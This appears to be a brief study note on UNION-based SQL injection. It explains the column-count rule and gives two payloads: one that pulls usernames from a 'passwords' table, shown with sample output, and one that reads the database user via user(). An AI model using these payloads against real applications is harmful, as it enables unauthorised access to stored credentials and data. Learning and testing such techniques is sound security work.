1,2,3,#SQL_Injection 

---

## Union Clause

- The two queries joined by **Union** must have the same number of columns. If they don't we can populate the columns with dummy values as follows:
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
which would return:
```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

**Note**: It joins the rows of both queries => both the queries must output same number of columns




## Union Injection

- We can also execute a command(i.e. `user()`) using **UNION** as follows:
```bash
dummy' UNION SELECT 1, user(), 3, 4-- -	
```



